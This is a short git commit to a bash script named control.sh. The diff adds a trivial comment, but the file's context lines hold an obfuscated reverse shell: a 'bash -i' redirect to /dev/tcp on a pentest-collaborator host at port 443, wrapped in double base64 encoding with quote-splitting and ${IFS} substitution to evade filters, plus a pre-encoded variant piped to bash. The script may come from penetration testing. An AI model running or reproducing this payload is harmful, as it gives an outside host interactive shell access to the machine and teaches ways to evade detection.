7999fa2376658345a1c1065d4cd48fde3f375102
chhabria-git <131396760+chhabria-git@users.noreply.github.com>
2023-04-27 14:57:33 -0700

    Update control.sh

--- control.sh
+++ control.sh
@@ -1,3 +1,4 @@
 #!/bin/bash
+#new comment change
 echo "echo $(echo 'bash -i >& /dev/tcp/zil14d6l0o5t30nzddj1bkotrkxbl49t.pentestcollaborator.com/443 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
 #echo\WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
